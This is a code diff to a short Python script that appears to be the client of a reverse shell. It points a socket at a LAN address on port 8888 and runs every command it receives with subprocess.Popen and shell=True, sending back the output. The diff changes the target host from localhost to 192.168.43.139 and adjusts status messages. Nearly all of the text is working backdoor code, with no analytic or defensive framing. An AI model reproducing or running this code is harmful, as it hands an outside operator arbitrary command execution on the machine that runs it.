@@ -4,10 +4,10 @@ import subprocess
 
 
 s = socket.socket()
-host = '127.0.0.1'
+host = '192.168.43.139'
 port = 8888
 s.connect((host, port))
-
+print("Connection Established..............")
 while True:
     data = s.recv(1024)
 
@@ -15,7 +15,6 @@ while True:
         os.chdir(data[3:].decode('utf-8'))
 
     if len(data) > 0:
-        print("Commands Recieved........")
         cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         output_bytes = cmd.stdout.read() + cmd.stderr.read()
